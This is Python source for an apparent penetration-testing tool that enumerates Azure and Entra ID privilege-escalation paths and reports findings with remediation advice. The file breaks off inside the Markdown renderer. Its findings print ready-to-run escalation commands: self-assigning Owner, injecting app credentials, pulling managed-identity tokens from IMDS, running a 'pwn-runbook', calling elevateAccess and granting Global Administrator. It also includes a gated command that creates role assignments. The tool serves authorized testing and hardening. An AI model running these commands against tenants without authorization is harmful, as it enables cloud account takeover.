#!/usr/bin/env python3
"""
Azure Privilege Escalation — agent.py
Authorized penetration testing use only.
"""

import argparse
import json
import subprocess
import sys
import re
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Finding IDs
# ---------------------------------------------------------------------------
# AZPE-001  RBAC write on subscription/resource group → self-assign Owner
# AZPE-002  User Access Administrator at subscription scope
# AZPE-003  Custom role with wildcard (*/write or */*)
# AZPE-004  Owned app registration with high-priv SP
# AZPE-005  Application.ReadWrite.All on owned app → tenant-wide SP cred injection
# AZPE-006  VM with managed identity carrying Owner/Contributor/UAA
# AZPE-007  VMSS with managed identity carrying Owner/Contributor/UAA
# AZPE-008  Automation Account with Contributor/Owner RunAs or managed identity
# AZPE-009  Entra ID role: Application Administrator
# AZPE-010  Entra ID role: Privileged Role Administrator
# AZPE-011  Entra ID role: Global Administrator
# AZPE-012  Entra ID role: Cloud Application Administrator
# AZPE-013  Entra ID role: Hybrid Identity Administrator
# AZPE-014  Logic App with managed identity carrying Owner/Contributor

# Entra ID built-in role GUIDs (stable across tenants)
ESCALATION_ENTRA_ROLES = {
    "62e90394-69f5-4237-9190-012177145e10": ("Global Administrator", "CRITICAL"),
    "e8611ab8-c189-46e8-94e1-60213ab1f814": ("Privileged Role Administrator", "CRITICAL"),
    "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3": ("Application Administrator", "HIGH"),
    "158c047a-c907-4556-b7ef-446551a6b5f7": ("Cloud Application Administrator", "HIGH"),
    "2b745bdf-0803-4d80-aa65-822c4493daac": ("Hybrid Identity Administrator", "HIGH"),
    "8329153b-31d0-4727-b945-745eb3bc5f31": ("Domain Name Administrator", "MEDIUM"),
    "be2f45a1-457d-42af-a067-6ec1fa63bc45": ("External Identity Provider Administrator", "MEDIUM"),
}

# Azure RBAC role GUIDs that allow privilege escalation
ESCALATION_RBAC_ROLES = {
    "8e3af657-a8ff-443c-a75c-2fe8c4bcb635": ("Owner", "CRITICAL"),
    "18d7d88d-d35e-4fb5-a5c3-7773c20a72d9": ("User Access Administrator", "CRITICAL"),
    "b24988ac-6180-42a0-ab88-20f7382dd24c": ("Contributor", "HIGH"),
}

# Dangerous Graph app permissions (application type only)
DANGEROUS_GRAPH_PERMS = {
    "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9": "Application.ReadWrite.All",
    "06b708a9-e830-4db3-a914-8e69da51d44f": "AppRoleAssignment.ReadWrite.All",
    "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8": "RoleManagement.ReadWrite.Directory",
    "741f803b-c850-494e-b5df-cde7c675a1ca": "User.ReadWrite.All",
    "62a82d76-70ea-41e2-9197-370581804d09": "Group.ReadWrite.All",
    "19dbc75e-c2e2-444c-a770-ec69d8559fc7": "Directory.ReadWrite.All",
}

SEVERITY_ICON = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}

# ---------------------------------------------------------------------------
# Azure CLI helpers
# ---------------------------------------------------------------------------

def az(args: List[str], timeout: int = 90) -> Optional[Any]:
    cmd = ["az"] + args + ["--output", "json"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if result.returncode != 0:
            err = result.stderr.strip()
            if "az login" in err or "Please run" in err:
                print("[!] Not authenticated. Run: az login", file=sys.stderr)
                sys.exit(1)
            return None
        return json.loads(result.stdout) if result.stdout.strip() else None
    except subprocess.TimeoutExpired:
        print(f"[!] az {' '.join(args[:3])} timed out after {timeout}s", file=sys.stderr)
        return None
    except json.JSONDecodeError:
        return None
    except FileNotFoundError:
        print("[!] az CLI not found. Install: https://docs.microsoft.com/cli/azure/install-azure-cli", file=sys.stderr)
        sys.exit(1)


def az_rest(url: str, method: str = "GET", timeout: int = 60) -> Optional[Any]:
    cmd = ["az", "rest", "--method", method, "--url", url, "--output", "json"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if result.returncode != 0:
            return None
        return json.loads(result.stdout) if result.stdout.strip() else None
    except (subprocess.TimeoutExpired, json.JSONDecodeError, FileNotFoundError):
        return None


def get_current_principal() -> Dict[str, str]:
    acc = az(["account", "show"])
    if not acc:
        return {}
    user = acc.get("user", {})
    return {
        "name": user.get("name", "unknown"),
        "type": user.get("type", "unknown"),
        "tenant_id": acc.get("tenantId", ""),
        "subscription_id": acc.get("id", ""),
        "subscription_name": acc.get("name", ""),
    }


def get_subscriptions() -> List[Dict]:
    subs = az(["account", "list"])
    return subs if isinstance(subs, list) else []


def finding(fid: str, title: str, severity: str, description: str,
            evidence: Any = None, escalation_path: str = "",
            recommendation: str = "") -> Dict:
    return {
        "id": fid,
        "title": title,
        "severity": severity,
        "description": description,
        "escalation_path": escalation_path,
        "evidence": evidence or {},
        "recommendation": recommendation,
    }


# ---------------------------------------------------------------------------
# Escalation path analysis modules
# ---------------------------------------------------------------------------

def rbac_paths(subscription_id: str) -> List[Dict]:
    findings = []
    scope = f"/subscriptions/{subscription_id}"

    assignments = az(["role", "assignment", "list", "--subscription", subscription_id,
                      "--include-inherited", "--include-groups"])
    if not isinstance(assignments, list):
        return findings

    principal = get_current_principal()
    current_name = principal.get("name", "").lower()

    # Collect what our principal holds (by name match — approximation before OID lookup)
    my_assignments = [a for a in assignments
                      if a.get("principalName", "").lower() == current_name
                      or a.get("principalId", "") == principal.get("name", "")]

    # Check all role definitions for dangerous permissions
    role_defs = az(["role", "definition", "list", "--subscription", subscription_id,
                    "--custom-role-only", "false"])
    if not isinstance(role_defs, list):
        role_defs = []

    role_lookup: Dict[str, Dict] = {
        rd.get("id", ""): rd for rd in role_defs if rd.get("id")
    }
    role_by_name: Dict[str, Dict] = {
        rd.get("roleName", ""): rd for rd in role_defs
    }

    # Check if current principal has roleAssignments/write
    for a in assignments:
        role_name = a.get("roleDefinitionName", "")
        role_id = a.get("roleDefinitionId", "")
        scope_val = a.get("scope", "")
        principal_name = a.get("principalName", "")
        principal_type = a.get("principalType", "")

        rd = role_by_name.get(role_name) or role_lookup.get(role_id, {})
        actions = []
        for perm in rd.get("permissions", []):
            actions.extend(perm.get("actions", []))

        has_rbac_write = any(
            act in ("*", "Microsoft.Authorization/*", "Microsoft.Authorization/roleAssignments/*",
                    "Microsoft.Authorization/roleAssignments/write")
            for act in actions
        )

        if has_rbac_write and (
            scope_val in (scope, "/", f"{scope}/")
            or scope_val.startswith(scope + "/resourceGroups")
        ):
            findings.append(finding(
                "AZPE-001",
                "RBAC Write Permission → Self-Assign Owner",
                "CRITICAL",
                f"Principal '{principal_name}' ({principal_type}) has role '{role_name}' "
                f"which includes Microsoft.Authorization/roleAssignments/write at scope '{scope_val}'. "
                "An attacker can self-assign the Owner role on the subscription.",
                evidence={"principal": principal_name, "role": role_name, "scope": scope_val, "actions": actions[:10]},
                escalation_path=(
                    f"az role assignment create --assignee <your-principal-id> "
                    f"--role Owner --scope {scope_val}"
                ),
                recommendation="Remove roleAssignments/write unless this principal is a privileged admin. "
                               "Apply deny assignments where possible."
            ))

        # User Access Administrator is an escalation path on its own
        if role_name == "User Access Administrator" and scope_val.startswith(scope):
            findings.append(finding(
                "AZPE-002",
                "User Access Administrator → Owner Assignment",
                "CRITICAL",
                f"Principal '{principal_name}' holds User Access Administrator at scope '{scope_val}'. "
                "UAA can assign Owner to any principal including itself.",
                evidence={"principal": principal_name, "scope": scope_val},
                escalation_path=(
                    f"az role assignment create --assignee <your-principal-id> "
                    f"--role Owner --scope {scope_val}"
                ),
                recommendation="Restrict UAA assignments to PIM-eligible roles only with justification workflow."
            ))

    # Custom roles with wildcard actions
    custom_roles = az(["role", "definition", "list", "--subscription", subscription_id,
                       "--custom-role-only", "true"])
    if isinstance(custom_roles, list):
        for cr in custom_roles:
            for perm in cr.get("permissions", []):
                for act in perm.get("actions", []):
                    if act in ("*", "*/write", "*/delete", "Microsoft.Authorization/*"):
                        findings.append(finding(
                            "AZPE-003",
                            f"Custom Role Wildcard: {cr.get('roleName', 'unknown')}",
                            "HIGH",
                            f"Custom role '{cr.get('roleName')}' contains wildcard action '{act}'. "
                            "Any principal with this role can escalate by exercising write operations "
                            "across all resource types.",
                            evidence={"role_name": cr.get("roleName"), "wildcard_action": act,
                                      "assignable_scopes": cr.get("assignableScopes", [])},
                            recommendation="Replace wildcard actions with minimum required explicit permissions."
                        ))
                        break

    return findings


def sp_paths(tenant_id: str) -> List[Dict]:
    findings = []

    # App registrations owned by current principal
    owned_apps = az_rest(
        "https://graph.microsoft.com/v1.0/me/ownedObjects?$filter=@odata.type eq '#microsoft.graph.application'"
    )
    if not owned_apps:
        owned_apps = az_rest("https://graph.microsoft.com/v1.0/me/ownedObjects")

    apps = []
    if isinstance(owned_apps, dict):
        apps = [o for o in owned_apps.get("value", [])
                if o.get("@odata.type") == "#microsoft.graph.application"]

    for app in apps:
        app_id = app.get("appId", "")
        display_name = app.get("displayName", "unknown")

        # Check required resource accesses for dangerous Graph app permissions
        for resource_access in app.get("requiredResourceAccess", []):
            resource_app_id = resource_access.get("resourceAppId", "")
            if resource_app_id != "00000003-0000-0000-c000-000000000000":  # MS Graph
                continue
            for access in resource_access.get("resourceAccess", []):
                perm_id = access.get("id", "")
                access_type = access.get("type", "")
                if access_type == "Role" and perm_id in DANGEROUS_GRAPH_PERMS:
                    perm_name = DANGEROUS_GRAPH_PERMS[perm_id]
                    findings.append(finding(
                        "AZPE-005",
                        f"Owned App '{display_name}' Has {perm_name}",
                        "CRITICAL",
                        f"You own app registration '{display_name}' (appId: {app_id}) which has "
                        f"Graph application permission '{perm_name}'. "
                        "Adding a client secret to this app and authenticating as its service principal "
                        "grants this permission tenant-wide.",
                        evidence={"app_id": app_id, "display_name": display_name,
                                  "dangerous_permission": perm_name},
                        escalation_path=(
                            f"az ad app credential reset --id {app_id} --append\n"
                            f"az login --service-principal -u {app_id} "
                            f"--password <new-secret> --tenant {tenant_id}\n"
                            f"# Now acting as SP with {perm_name}"
                        ),
                        recommendation="Audit app ownership. Remove Graph application permissions not required. "
                                       "Require admin consent review for privileged permissions."
                    ))

        # Find the SP for this app and check its RBAC roles across subscriptions
        sp_list = az(["ad", "sp", "list", "--filter", f"appId eq '{app_id}'"])
        if not isinstance(sp_list, list) or not sp_list:
            continue
        sp_obj_id = sp_list[0].get("id", "")

        for sub in get_subscriptions():
            sub_id = sub.get("id", "")
            sp_assignments = az(["role", "assignment", "list",
                                  "--assignee", sp_obj_id,
                                  "--subscription", sub_id,
                                  "--include-inherited"])
            if not isinstance(sp_assignments, list):
                continue
            for a in sp_assignments:
                role_name = a.get("roleDefinitionName", "")
                scope_val = a.get("scope", "")
                if role_name in ("Owner", "Contributor", "User Access Administrator"):
                    severity = "CRITICAL" if role_name in ("Owner", "User Access Administrator") else "HIGH"
                    findings.append(finding(
                        "AZPE-004",
                        f"Owned App SP Has '{role_name}' on Sub '{sub.get('name', sub_id)}'",
                        severity,
                        f"Service principal for app '{display_name}' holds role '{role_name}' "
                        f"at scope '{scope_val}'. As app owner you can add credentials and authenticate "
                        "as this SP to gain its Azure RBAC permissions.",
                        evidence={"app_id": app_id, "sp_object_id": sp_obj_id,
                                  "role": role_name, "scope": scope_val,
                                  "subscription": sub.get("name", sub_id)},
                        escalation_path=(
                            f"az ad app credential reset --id {app_id} --append\n"
                            f"az login --service-principal -u {app_id} "
                            f"--password <new-secret> --tenant {tenant_id}\n"
                            f"az account set --subscription {sub_id}"
                        ),
                        recommendation="Remove app ownership or restrict SP RBAC to least privilege."
                    ))

    return findings


def identity_paths(subscription_id: str) -> List[Dict]:
    findings = []

    vms = az(["vm", "list", "--subscription", subscription_id])
    if not isinstance(vms, list):
        vms = []

    for vm in vms:
        vm_name = vm.get("name", "unknown")
        rg = vm.get("resourceGroup", "")
        identity = vm.get("identity", {})
        if not identity:
            continue

        identity_type = identity.get("type", "")
        principal_id = identity.get("principalId", "")
        if not principal_id:
            # System-assigned if type includes SystemAssigned
            if "SystemAssigned" not in identity_type:
                continue

        # Check RBAC for the managed identity's principal
        if principal_id:
            assignments = az(["role", "assignment", "list",
                               "--assignee", principal_id,
                               "--subscription", subscription_id,
                               "--include-inherited"])
            if isinstance(assignments, list):
                for a in assignments:
                    role_name = a.get("roleDefinitionName", "")
                    scope_val = a.get("scope", "")
                    if role_name in ("Owner", "Contributor", "User Access Administrator"):
                        severity = "CRITICAL" if role_name in ("Owner", "User Access Administrator") else "HIGH"
                        findings.append(finding(
                            "AZPE-006",
                            f"VM '{vm_name}' Managed Identity Has '{role_name}'",
                            severity,
                            f"VM '{vm_name}' in resource group '{rg}' has a managed identity "
                            f"({identity_type}) with role '{role_name}' at scope '{scope_val}'. "
                            "From code execution on this VM, IMDS provides an OAuth token for this identity.",
                            evidence={"vm_name": vm_name, "resource_group": rg,
                                      "identity_type": identity_type, "principal_id": principal_id,
                                      "role": role_name, "scope": scope_val},
                            escalation_path=(
                                "# From inside the VM:\n"
                                "curl -s -H 'Metadata: true' "
                                "'http://169.254.169.254/metadata/identity/oauth2/token"
                                "?api-version=2018-02-01&resource=https://management.azure.com/' "
                                "| python3 -c \"import sys,json; print(json.load(sys.stdin)['access_token'])\"\n"
                                "# Use the token in Authorization: Bearer <token>"
                            ),
                            recommendation="Apply least-privilege RBAC to managed identities. "
                                           "Avoid Contributor or higher for VM identities."
                        ))

    # VMSS
    vmss_list = az(["vmss", "list", "--subscription", subscription_id])
    if isinstance(vmss_list, list):
        for vmss in vmss_list:
            vmss_name = vmss.get("name", "unknown")
            rg = vmss.get("resourceGroup", "")
            identity = vmss.get("identity", {})
            if not identity:
                continue
            principal_id = identity.get("principalId", "")
            identity_type = identity.get("type", "")
            if not principal_id:
                continue
            assignments = az(["role", "assignment", "list",
                               "--assignee", principal_id,
                               "--subscription", subscription_id,
                               "--include-inherited"])
            if isinstance(assignments, list):
                for a in assignments:
                    role_name = a.get("roleDefinitionName", "")
                    scope_val = a.get("scope", "")
                    if role_name in ("Owner", "Contributor", "User Access Administrator"):
                        severity = "CRITICAL" if role_name in ("Owner", "User Access Administrator") else "HIGH"
                        findings.append(finding(
                            "AZPE-007",
                            f"VMSS '{vmss_name}' Managed Identity Has '{role_name}'",
                            severity,
                            f"VMSS '{vmss_name}' has managed identity with '{role_name}' at '{scope_val}'. "
                            "Any pod/container on these instances can acquire the IMDS token.",
                            evidence={"vmss_name": vmss_name, "resource_group": rg,
                                      "role": role_name, "scope": scope_val},
                            recommendation="Restrict VMSS managed identity to least-privilege scoped role."
                        ))

    return findings


def automation_paths(subscription_id: str) -> List[Dict]:
    findings = []

    accounts = az(["automation", "account", "list", "--subscription", subscription_id])
    if not isinstance(accounts, list):
        return findings

    for acc in accounts:
        acc_name = acc.get("name", "unknown")
        rg = acc.get("resourceGroup", "")
        identity = acc.get("identity", {})
        principal_id = identity.get("principalId", "") if identity else ""

        # Check managed identity RBAC
        if principal_id:
            assignments = az(["role", "assignment", "list",
                               "--assignee", principal_id,
                               "--subscription", subscription_id,
                               "--include-inherited"])
            if isinstance(assignments, list):
                for a in assignments:
                    role_name = a.get("roleDefinitionName", "")
                    scope_val = a.get("scope", "")
                    if role_name in ("Owner", "Contributor", "User Access Administrator"):
                        severity = "CRITICAL" if role_name in ("Owner", "User Access Administrator") else "HIGH"
                        findings.append(finding(
                            "AZPE-008",
                            f"Automation Account '{acc_name}' Identity Has '{role_name}'",
                            severity,
                            f"Automation Account '{acc_name}' has managed identity with role '{role_name}' "
                            f"at scope '{scope_val}'. An attacker who can create/modify runbooks can execute "
                            "arbitrary code as this identity.",
                            evidence={"account": acc_name, "resource_group": rg,
                                      "role": role_name, "scope": scope_val},
                            escalation_path=(
                                f"az automation runbook create --automation-account-name {acc_name} "
                                f"--resource-group {rg} --name pwn-runbook --type PowerShell "
                                f"--subscription {subscription_id}\n"
                                f"az automation runbook replace-content --automation-account-name {acc_name} "
                                f"--resource-group {rg} --name pwn-runbook "
                                f"--content 'Connect-AzAccount -Identity; Get-AzRoleAssignment'\n"
                                f"az automation runbook publish --automation-account-name {acc_name} "
                                f"--resource-group {rg} --name pwn-runbook\n"
                                f"az automation runbook start --automation-account-name {acc_name} "
                                f"--resource-group {rg} --name pwn-runbook"
                            ),
                            recommendation="Restrict Automation Account identity to minimum required scope. "
                                           "Enable job log retention and alert on new runbook creation."
                        ))

    return findings


def entra_paths(tenant_id: str) -> List[Dict]:
    findings = []

    # Get current user's directory role memberships
    my_roles = az_rest("https://graph.microsoft.com/v1.0/me/memberOf?$select=id,displayName,roleTemplateId")
    if not isinstance(my_roles, dict):
        return findings

    for member in my_roles.get("value", []):
        odata_type = member.get("@odata.type", "")
        if odata_type != "#microsoft.graph.directoryRole":
            continue
        role_template_id = member.get("roleTemplateId", "")
        role_display = member.get("displayName", "unknown")

        if role_template_id in ESCALATION_ENTRA_ROLES:
            _, severity = ESCALATION_ENTRA_ROLES[role_template_id]

            if role_template_id == "62e90394-69f5-4237-9190-012177145e10":
                # Global Administrator
                findings.append(finding(
                    "AZPE-011",
                    "Global Administrator → elevateAccess → Owner on All Subscriptions",
                    "CRITICAL",
                    "Current principal holds Global Administrator role. "
                    "The elevateAccess API grants User Access Administrator at the '/' (root) management group scope, "
                    "which allows assigning Owner to any subscription in the tenant.",
                    evidence={"role": role_display, "role_template_id": role_template_id},
                    escalation_path=(
                        "# Step 1: Elevate to root scope\n"
                        f"az rest --method POST --url "
                        f"'https://management.azure.com/providers/Microsoft.Authorization/elevateAccess"
                        f"?api-version=2016-07-01'\n"
                        "# Step 2: Assign Owner on target subscription\n"
                        "az role assignment create --assignee <your-object-id> "
                        "--role Owner --scope /subscriptions/<target-subscription-id>"
                    ),
                    recommendation="Restrict Global Admin accounts. Require PIM elevation with approval. "
                                   "Alert on elevateAccess API calls (Activity Log: ElevateAccess action)."
                ))

            elif role_template_id == "e8611ab8-c189-46e8-94e1-60213ab1f814":
                # Privileged Role Administrator
                findings.append(finding(
                    "AZPE-010",
                    "Privileged Role Administrator → Assign Global Admin",
                    "CRITICAL",
                    "Current principal holds Privileged Role Administrator. "
                    "This role can assign any Entra ID directory role including Global Administrator.",
                    evidence={"role": role_display, "role_template_id": role_template_id},
                    escalation_path=(
                        "az rest --method POST "
                        "--url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments' "
                        "--body '{\"@odata.type\": \"#microsoft.graph.unifiedRoleAssignment\", "
                        "\"roleDefinitionId\": \"62e90394-69f5-4237-9190-012177145e10\", "
                        "\"principalId\": \"<your-object-id>\", "
                        "\"directoryScopeId\": \"/\"}'"
                    ),
                    recommendation="Limit Privileged Role Administrator to break-glass accounts. "
                                   "Enable PIM for all privileged role assignments."
                ))

            elif role_template_id == "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3":
                # Application Administrator
                findings.append(finding(
                    "AZPE-009",
                    "Application Administrator → SP Credential Injection",
                    "HIGH",
                    "Current principal holds Application Administrator. "
                    "This role allows adding credentials to any app registration (not owned by a user). "
                    "If any service principal has high-privilege Azure RBAC, credentials can be injected "
                    "to authenticate as that SP.",
                    evidence={"role": role_display, "role_template_id": role_template_id},
                    escalation_path=(
                        "# Find high-priv SPs:\n"
                        "az role assignment list --all --include-groups "
                        "--query \"[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor']\"\n"
                        "# Add credential to target app:\n"
                        "az ad app credential reset --id <app-id> --append"
                    ),
                    recommendation="Restrict Application Administrator to specific app registrations. "
                                   "Use Conditional Access to limit SP authentication sources."
                ))

            elif role_template_id == "158c047a-c907-4556-b7ef-446551a6b5f7":
                # Cloud Application Administrator
                findings.append(finding(
                    "AZPE-012",
                    "Cloud Application Administrator → SP Credential Injection",
                    "HIGH",
                    "Current principal holds Cloud Application Administrator. "
                    "Similar to Application Administrator but scoped to non-on-premise app registrations.",
                    evidence={"role": role_display, "role_template_id": role_template_id},
                    recommendation="Review all app registrations accessible to this role for high-priv SPs."
                ))

            elif role_template_id == "2b745bdf-0803-4d80-aa65-822c4493daac":
                # Hybrid Identity Administrator
                findings.append(finding(
                    "AZPE-013",
                    "Hybrid Identity Administrator → Directory Sync Abuse",
                    "HIGH",
                    "Current principal holds Hybrid Identity Administrator. "
                    "This role can manage Azure AD Connect configuration and on-premises sync. "
                    "In hybrid environments, this can be leveraged to sync malicious accounts from on-prem.",
                    evidence={"role": role_display, "role_template_id": role_template_id},
                    recommendation="Restrict Hybrid Identity Administrator to dedicated sync accounts. "
                                   "Monitor for Azure AD Connect configuration changes."
                ))

    return findings


def logic_app_paths(subscription_id: str) -> List[Dict]:
    findings = []

    logic_apps = az(["logic", "workflow", "list", "--subscription", subscription_id])
    if not isinstance(logic_apps, list):
        return findings

    for la in logic_apps:
        la_name = la.get("name", "unknown")
        rg = la.get("resourceGroup", "")
        state = la.get("state", "")
        if state != "Enabled":
            continue
        identity = la.get("identity", {})
        if not identity:
            continue
        principal_id = identity.get("principalId", "")
        if not principal_id:
            continue
        assignments = az(["role", "assignment", "list",
                           "--assignee", principal_id,
                           "--subscription", subscription_id,
                           "--include-inherited"])
        if isinstance(assignments, list):
            for a in assignments:
                role_name = a.get("roleDefinitionName", "")
                scope_val = a.get("scope", "")
                if role_name in ("Owner", "Contributor", "User Access Administrator"):
                    severity = "CRITICAL" if role_name in ("Owner", "User Access Administrator") else "HIGH"
                    findings.append(finding(
                        "AZPE-014",
                        f"Logic App '{la_name}' Identity Has '{role_name}'",
                        severity,
                        f"Enabled Logic App '{la_name}' has managed identity with '{role_name}' "
                        f"at scope '{scope_val}'. Modifying workflow actions can execute code as this identity.",
                        evidence={"logic_app": la_name, "resource_group": rg,
                                  "role": role_name, "scope": scope_val},
                        recommendation="Restrict Logic App managed identity permissions to minimum required."
                    ))

    return findings


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

def cmd_check(args: argparse.Namespace) -> int:
    principal = get_current_principal()
    if not principal:
        print("[!] Could not determine current principal. Run 'az login' first.")
        return 1

    print(f"[*] Current principal: {principal['name']} ({principal['type']})")
    print(f"[*] Tenant: {principal['tenant_id']}")
    print(f"[*] Subscription: {principal['subscription_name']} ({principal['subscription_id']})")

    all_findings: List[Dict] = []
    sub_id = principal["subscription_id"]
    tenant_id = principal["tenant_id"]

    print("[*] Checking RBAC paths...")
    all_findings.extend(rbac_paths(sub_id))
    print("[*] Checking service principal paths...")
    all_findings.extend(sp_paths(tenant_id))
    print("[*] Checking managed identity paths...")
    all_findings.extend(identity_paths(sub_id))
    print("[*] Checking Automation Account paths...")
    all_findings.extend(automation_paths(sub_id))
    print("[*] Checking Entra ID role paths...")
    all_findings.extend(entra_paths(tenant_id))
    print("[*] Checking Logic App paths...")
    all_findings.extend(logic_app_paths(sub_id))

    if args.output == "json":
        print(json.dumps({"principal": principal, "findings": all_findings}, indent=2))
    else:
        _render_summary(principal, all_findings)

    return 0


def cmd_rbac_paths(args: argparse.Namespace) -> int:
    principal = get_current_principal()
    if not principal:
        print("[!] Not authenticated.")
        return 1
    sub_id = args.subscription or principal["subscription_id"]
    findings = rbac_paths(sub_id)
    if args.output == "json":
        print(json.dumps(findings, indent=2))
    else:
        _render_findings_section("RBAC Escalation Paths", findings)
    return 0


def cmd_sp_paths(args: argparse.Namespace) -> int:
    principal = get_current_principal()
    if not principal:
        print("[!] Not authenticated.")
        return 1
    tenant_id = args.tenant or principal["tenant_id"]
    findings = sp_paths(tenant_id)
    if args.output == "json":
        print(json.dumps(findings, indent=2))
    else:
        _render_findings_section("Service Principal Escalation Paths", findings)
    return 0


def cmd_identity_paths(args: argparse.Namespace) -> int:
    principal = get_current_principal()
    if not principal:
        print("[!] Not authenticated.")
        return 1
    sub_id = args.subscription or principal["subscription_id"]
    findings = identity_paths(sub_id)
    if args.output == "json":
        print(json.dumps(findings, indent=2))
    else:
        _render_findings_section("Managed Identity Escalation Paths", findings)
    return 0


def cmd_automation_paths(args: argparse.Namespace) -> int:
    principal = get_current_principal()
    if not principal:
        print("[!] Not authenticated.")
        return 1
    sub_id = args.subscription or principal["subscription_id"]
    findings = automation_paths(sub_id)
    if args.output == "json":
        print(json.dumps(findings, indent=2))
    else:
        _render_findings_section("Automation Account Escalation Paths", findings)
    return 0


def cmd_entra_paths(args: argparse.Namespace) -> int:
    principal = get_current_principal()
    if not principal:
        print("[!] Not authenticated.")
        return 1
    tenant_id = args.tenant or principal["tenant_id"]
    findings = entra_paths(tenant_id)
    if args.output == "json":
        print(json.dumps(findings, indent=2))
    else:
        _render_findings_section("Entra ID Role Escalation Paths", findings)
    return 0


def cmd_attempt_rbac_add(args: argparse.Namespace) -> int:
    if not args.confirm_authorized:
        print("[!] --confirm-authorized <AUTH-REF> is required for this command.")
        print("    Provide your pentest authorization reference (e.g., 'SOW-2026-042').")
        print("    This prevents accidental execution outside authorized engagements.")
        return 1

    principal = get_current_principal()
    if not principal:
        print("[!] Not authenticated.")
        return 1

    target_principal = args.assignee
    role = args.role
    scope = args.scope or f"/subscriptions/{principal['subscription_id']}"

    print(f"[!] ACTIVE ACTION — Authorization ref: {args.confirm_authorized}")
    print(f"[!] Assigning role '{role}' to '{target_principal}' at scope '{scope}'")

    result = az(["role", "assignment", "create",
                 "--assignee", target_principal,
                 "--role", role,
                 "--scope", scope])

    if result:
        print(f"[+] Role assignment created successfully.")
        print(json.dumps({
            "action": "role_assignment_create",
            "auth_ref": args.confirm_authorized,
            "assignee": target_principal,
            "role": role,
            "scope": scope,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "result": result,
        }, indent=2))
        return 0
    else:
        print(f"[-] Role assignment failed. Check permissions and scope.")
        return 1


def cmd_report(args: argparse.Namespace) -> int:
    principal = get_current_principal()
    if not principal:
        print("[!] Not authenticated.")
        return 1

    sub_id = args.subscription or principal["subscription_id"]
    tenant_id = args.tenant or principal["tenant_id"]

    all_findings: List[Dict] = []
    all_findings.extend(rbac_paths(sub_id))
    all_findings.extend(sp_paths(tenant_id))
    all_findings.extend(identity_paths(sub_id))
    all_findings.extend(automation_paths(sub_id))
    all_findings.extend(entra_paths(tenant_id))
    all_findings.extend(logic_app_paths(sub_id))

    report = {
        "tool": "performing-azure-privilege-escalation",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "principal": principal,
        "finding_count": len(all_findings),
        "severity_summary": _severity_counts(all_findings),
        "findings": all_findings,
    }

    if args.output == "json":
        out = json.dumps(report, indent=2)
    else:
        out = _render_markdown(report)

    if args.file:
        with open(args.file, "w") as f:
            f.write(out)
        print(f"[+] Report written to {args.file}")
    else:
        print(out)

    return 0


# ---------------------------------------------------------------------------
# Rendering helpers
# ---------------------------------------------------------------------------

def _severity_counts(findings: List[Dict]) -> Dict[str, int]:
    counts: Dict[str, int] = {}
    for f in findings:
        s = f.get("severity", "INFO")
        counts[s] = counts.get(s, 0) + 1
    return counts


def _render_findings_section(title: str, findings: List[Dict]) -> None:
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")
    if not findings:
        print("  No escalation paths found.")
        return
    for f in findings:
        icon = SEVERITY_ICON.get(f["severity"], "⚪")
        print(f"\n{icon} [{f['id']}] {f['title']} ({f['severity']})")
        print(f"   {f['description'][:200]}")
        if f.get("escalation_path"):
            print(f"\n   Escalation path:\n   {f['escalation_path'][:300]}")


def _render_summary(principal: Dict, findings: List[Dict]) -> None:
    counts = _severity_counts(findings)
    print(f"\n{'='*60}")
    print(f"  Azure Privilege Escalation — Results")
    print(f"{'='*60}")
    print(f"  Principal: {principal['name']} ({principal['type']})")
    print(f"  Tenant:    {principal['tenant_id']}")
    print(f"  Sub:       {principal['subscription_name']}")
    print(f"\n  Findings: {len(findings)} total")
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        c = counts.get(sev, 0)
        if c:
            print(f"    {SEVERITY_ICON[sev]} {sev}: {c}")

    if not findings:
        print("\n  No privilege escalation paths identified.")
        return

    print(f"\n{'='*60}")
    for f in sorted(findings, key=lambda x: ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"].index(x["severity"])):
        icon = SEVERITY_ICON.get(f["severity"], "⚪")
        print(f"\n{icon} [{f['id']}] {f['title']}")
        print(f"   Severity: {f['severity']}")
        print(f"   {f['description'][:300]}")
        if f.get("escalation_path"):
            print(f"\n   --- Escalation Path ---")
            for line in f["escalation_path"].split("\n"):
                print(f"   {line}")
        if f.get("recommendation"):
            print(f"\n   Recommendation: {f['recommendation']}")


def _render_markdown(report: Dict) -> str:
    lines = []
    p = report["principal"]
    ts = report["generated_at"]
    counts = report["severity_summary"]

    lines.append("# Azure Privilege Escalation Report")
    lines.append(f"\n**Generated:** {ts}  ")
    lines.append(f"**Principal:** {p['name']} ({p['type']})  ")
    lines.append(f"**Tenant:** {p['tenant_id']}  ")
    lines.append(f"**Subscription:** {p['subscription_name']} ({p['subscription_id']})  ")

    lines.append("\n## Summary\n")
    lines.append(f"| Severity | Count |")
    lines.append(f"|----------|-------|")
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        c = counts.get(sev, 0)
        if c:
            lines.append(f"| {SEVERITY_ICON[sev]} {sev} | {c} |")

    if not report["findings"]:
        lines.append("\n> No privilege escalation paths identified.")
        return "\n".join(lines)

    lines.append("\n## Escalation Paths\n")
    for f in sorted(report["findings"],
                    key=lambda x: ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"].index(x["severity"])):
        icon = SEVERITY_ICON.get(f["severity"], "⚪")
        lines.append(f"### {icon} [{f['id']}] {f['title']}")
        lines.append(f"\n**Severity:** {f['severity']}  ")
        lines.append(f"**Description:** {f['description']}")
        if f.get("escalation_path"):
            lines.append(f"\n**Escalation Path:**\n```bash\n{f['escalation_path']}\n```")
        if f.get("evidence"):
